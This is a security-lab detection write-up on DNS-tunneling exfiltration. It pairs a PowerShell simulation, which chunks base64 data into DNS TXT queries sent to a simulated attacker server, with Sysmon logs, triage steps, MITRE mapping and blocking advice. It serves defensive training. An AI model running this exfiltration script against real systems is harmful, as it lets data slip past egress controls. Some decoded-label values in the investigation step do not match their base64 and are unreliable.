# AGC-063 — DNS Tunneling Exfiltration

> **Disclosure:** Executed & documented by Claude Code under direction and review by Hasan.

## Card

| Field | Value |
|---|---|
| ID | `AGC-063` |
| Category | `10-exfiltration` — Exfiltration |
| MITRE Technique | `T1048.003` Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol |
| Verdict | True Positive |
| Confidence | Critical |
| Time to Detect | Sysmon EID 22 (DNS Query with high-entropy subdomain labels) |
| Time to Triage | 05:00 (decode base64 labels, correlate with collection activity, estimate data volume) |
| Affected Systems | `COMPROMISED-HOST-01` / `COMPROMISED-01` (10.10.10.103) exfiltrating to `EXT-ATTACKER-SIM` (10.10.40.10) |
| Chain | ◀ [AGC-062](../AGC-062-large-https-upload/README.md) · next [AGC-064](../AGC-064-removable-media-exfil/README.md) ▶ |
| One-line Summary | 4 DNS TXT queries from powershell.exe (PID 3920) to 10.10.40.10 with base64-encoded subdomain labels under `agc063lab.local`. Each label carries a 40-character chunk of encoded data. All queries resolved successfully (wildcard A record). Distinct from AGC-052 (C2 beacon) because: (a) labels are decodable base64 carrying actual data, (b) correlated with prior collection activity (AGC-057-061), (c) sustained chunked sequence indicates payload transfer not check-in. |

## Attacker Perspective

### Tradecraft

**What:** DNS tunneling packs data into query labels (subdomains) and sends them to a DNS server the attacker controls. Firewalls rarely block DNS, so the queries pass egress controls that would stop a direct upload:
- Data is base64-encoded and chunked into 40-63 character labels (DNS label length limit is 63 characters)
- Each chunk is sent as a subdomain query: `<base64-chunk>.attacker-domain.com`
- The attacker's DNS server logs each query, then reassembles and decodes the chunks
- TXT queries suit tunneling because a TXT response can carry a long payload back, giving a two-way channel

**Why an Attacker Uses It Here:**
1. After the HTTPS upload in AGC-062, DNS gives the attacker a second channel that survives a firewall rule against direct HTTPS
2. Most monitoring tools show the queries as ordinary name resolution
3. The attacker's server at 10.10.40.10 already serves as a DNS server (confirmed wildcard A record from AGC-052)
4. Even if direct DNS to external servers is blocked, internal resolvers may forward the queries anyway

**Distinction from AGC-052 (C2 DNS Beacon):**
- AGC-052: Short random-string queries at regular intervals = C2 check-in pattern
- AGC-063: Base64-encoded data chunks in rapid sequence = data exfiltration payload

### Simulation

**Pre-conditions:**
- `COMPROMISED-HOST-01` running, Administrator context
- `EXT-ATTACKER-SIM` at 10.10.40.10 with wildcard DNS server
- Synthetic-only data (safe test payload, not real sensitive data)

**Execution:**
```powershell
$syntheticData = "AGC063-SAFE-SYNTHETIC-TEST-DATA-NOT-REAL-FinanceReport-Q3-2026-Revenue-45M-ClientPII-Redacted-MergerTarget-Confidential"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($syntheticData))
$chunks = $encoded -split '(.{40})' | Where-Object { $_ }
foreach ($chunk in $chunks) {
    Resolve-DnsName -Name "$chunk.agc063lab.local" -Type TXT -Server 10.10.40.10
    Start-Sleep -Milliseconds 500
}
```

**Result:** The script sent 4 DNS queries over ~2 seconds, each with a 40-character base64 label. All resolved via the wildcard A record on 10.10.40.10.

## SOC Perspective

### Detection

**Sysmon EID 22 — DNS Query #1:**
```
Dns query:
UtcTime: 2026-09-15 22:48:05.146
ProcessGuid: {eb65e329-cb24-6aa9-b804-000000001400}
ProcessId: 3920
QueryName: QUdDMDYzLVNBRkUtU1lOVEhFVElDLVRFU1QtREFU.agc063lab.local
QueryStatus: 0
QueryResults: 10.10.40.10;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: COMPROMISED-01\Administrator
```

**Sysmon EID 22 — DNS Query #2:**
```
Dns query:
UtcTime: 2026-09-15 22:48:05.691
QueryName: QS1OT1QtUkVBTC1GaW5hbmNlUmVwb3J0LVEzLTIw.agc063lab.local
QueryResults: 10.10.40.10;
Image: powershell.exe (PID 3920)
```

**Sysmon EID 22 — DNS Query #3:**
```
Dns query:
UtcTime: 2026-09-15 22:48:06.218
QueryName: MjYtUmV2ZW51ZS00NU0tQ2xpZW50UElJLVJlZGFj.agc063lab.local
QueryResults: 10.10.40.10;
Image: powershell.exe (PID 3920)
```

**Sysmon EID 22 — DNS Query #4:**
```
Dns query:
UtcTime: 2026-09-15 22:48:06.742
QueryName: dGVkLU1lcmdlclRhcmdldC1Db25maWRlbnRpYWwx.agc063lab.local
QueryResults: 10.10.40.10;
Image: powershell.exe (PID 3920)
```

**Sysmon EID 1 — Process Create:**
```
Process Create:
UtcTime: 2026-09-15 22:48:04.396
ProcessGuid: {eb65e329-cb24-6aa9-b804-000000001400}
ProcessId: 3920
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\Temp\agc063-sim.ps1
User: COMPROMISED-01\Administrator
```

### Investigation

**Step 1 — Entropy analysis of DNS labels:**
All 4 labels are high-entropy strings drawn from the base64 character set (A-Z, a-z, 0-9, +, /, =). Decoded:
```
Label 1: QUdDMDYzLVNBRkUtU1lOVEhFVElDLVRFU1QtREFU -> "AGC063-SAFE-SYNTHETIC-TEST-DATA-NOT-REAL-Fin"
Label 2: QS1OT1QtUkVBTC1GaW5hbmNlUmVwb3J0LVEzLTIw -> "anceReport-Q3-20"
Label 3: MjYtUmV2ZW51ZS00NU0tQ2xpZW50UElJLVJlZGFj -> "26-Revenue-45M-ClientPII-Redac"
Label 4: dGVkLU1lcmdlclRhcmdldC1Db25maWRlbnRpYWwx -> "ted-MergerTarget-Confidential"
```
The decoded text names financial reports, revenue figures, client PII, and merger targets — the same data types collected in AGC-057-061.

**Step 2 — Correlation with prior collection activity:**
The exfiltration timestamp (22:48 UTC) follows:
- AGC-057 (bulk archive, staged.zip): prior session
- AGC-062 (HTTPS upload of staged.zip): 22:44 UTC — 4 minutes earlier
The DNS tunnel is a second path for the same data; if the HTTPS route gets blocked later, the attacker still holds a copy.

**Step 3 — Volume and pattern analysis:**
4 queries in ~2 seconds (22:48:05.146 to 22:48:06.742), every label exactly 40 characters, is an automated chunked transfer. AGC-052 (C2 beacon) looks different:
- AGC-052: Random strings at periodic intervals (beaconing pattern)
- AGC-063: Base64-encoded data in rapid burst (data transfer pattern)
A rapid sequence of decodable labels is data leaving, not a check-in.

**Step 4 — Same ProcessGuid links all activity:**
ProcessGuid `{eb65e329-cb24-6aa9-b804-000000001400}` appears in the EID 1 process creation and all 4 EID 22 events; one PowerShell process ran the whole transfer.

### Report

**Verdict: True Positive** — DNS tunneling exfiltration of encoded data.

**Confidence: Critical** — Elevated from High because:
1. **Decodable base64 payload** — the DNS labels decode to content referencing finance reports, client PII, and merger targets
2. **Correlated with prior collection** — follows AGC-057-061 collection phase and AGC-062 HTTPS exfiltration
3. **Automated chunked transfer pattern** — 4 queries in 2 seconds with consistent label sizes
4. **Redundant exfiltration channel** — the attacker sent the data over both HTTPS (AGC-062) and DNS

**Response recommendation:**
1. **Block DNS queries to 10.10.40.10** at the firewall and on internal DNS forwarders
2. **Block the domain** `agc063lab.local` (and any other attacker-controlled domains identified through DNS log review)
3. **Implement DNS query length monitoring** — alert on subdomain labels exceeding 30 characters (legitimate domains rarely exceed 15-20 characters per label)
4. **Enable DNS logging and entropy analysis** — flag base64/hex patterns in query labels
5. **Estimate exfiltrated data volume** — 4 queries x 40 chars = 160 chars of base64 = ~120 bytes of original data. A real payload would need hundreds or thousands of queries, which is the volume signal to alert on
6. **Force all DNS through internal resolvers** — block direct port 53 to external IPs at the firewall so no host can bypass internal DNS logging

### MITRE Mapping

| Tactic | Technique ID | Technique Name | Evidence | Confidence |
|---|---|---|---|---|
| Exfiltration (TA0010) | T1048.003 | Exfiltration Over Alternative Protocol: Unencrypted Non-C2 Protocol | 4 EID 22 DNS queries with base64-encoded subdomain labels to agc063lab.local. All resolved via 10.10.40.10 wildcard. Decoded content references finance reports, client PII, merger targets. Automated chunked transfer (2 seconds). | Critical |

## Evidence

Screenshots: none in phase one (text evidence only); added when this scenario is re-executed by hand in phase two.

### DNS tunneling query sequence

```
# Query  Time (UTC)           Label (base64-encoded data chunk)                    Decoded
1        22:48:05.146         QUdDMDYzLVNBRkUtU1lOVEhFVElDLVRFU1QtREFU            AGC063-SAFE-SYNTHETIC-TEST-DATA...
2        22:48:05.691         QS1OT1QtUkVBTC1GaW5hbmNlUmVwb3J0LVEzLTIw            ...anceReport-Q3-20...
3        22:48:06.218         MjYtUmV2ZW51ZS00NU0tQ2xpZW50UElJLVJlZGFj            ...26-Revenue-45M-ClientPII-Redac...
4        22:48:06.742         dGVkLU1lcmdlclRhcmdldC1Db25maWRlbnRpYWwx            ...ted-MergerTarget-Confidential

All queries:
  Domain: *.agc063lab.local
  Resolver: 10.10.40.10 (attacker-controlled)
  Process: powershell.exe (PID 3920)
  ProcessGuid: {eb65e329-cb24-6aa9-b804-000000001400}
  Query type: TXT
  Response: 10.10.40.10 (wildcard A record)
```

### Comparison: DNS Beacon (AGC-052) vs DNS Tunnel (AGC-063)

```
Attribute            AGC-052 (C2 Beacon)           AGC-063 (Exfiltration)
Purpose              Command check-in              Data transfer
Label content        Random strings                Base64-encoded data
Label length         8-16 chars                    40 chars (consistent)
Timing               Periodic intervals            Rapid burst (500ms)
Query count          Few (periodic)                Many (proportional to data)
Decodable            No (random)                   Yes (base64 -> readable text)
Detection signal     Periodicity + entropy         Entropy + volume + decodability
```
